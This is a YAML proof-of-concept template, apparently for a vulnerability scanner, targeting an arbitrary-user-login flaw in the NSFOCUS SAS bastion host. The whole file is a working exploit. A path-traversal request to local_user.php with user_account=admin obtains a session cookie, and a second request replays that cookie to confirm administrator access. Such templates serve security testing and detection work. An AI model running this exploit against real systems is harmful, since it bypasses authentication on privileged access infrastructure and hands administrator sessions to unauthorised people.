id: poc-yaml-lvmeng-SAS-arbitray-login
info:
  name: 绿盟-SAS堡垒机-任意用户登陆
  severity: high
  tags:
  - 任意用户登录
  finger: SAS堡垒机
requests:
- method: GET
  path: /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
  expression: status_code == 200 && contains(body, "\"status\":200")
  output:
  - regex_match(headers, "PHPSESSID=(?P<cookie>[^;]+);")
- method: GET
  path: /
  headers:
    Cookie: PHPSESSID={{.cookie}}
  expression: status_code == 200 && contains(body, "堡垒机管理员") && contains(body, "提醒检查：包括消息通知，告警通知、授权通知等")
variables: {}
transport: http
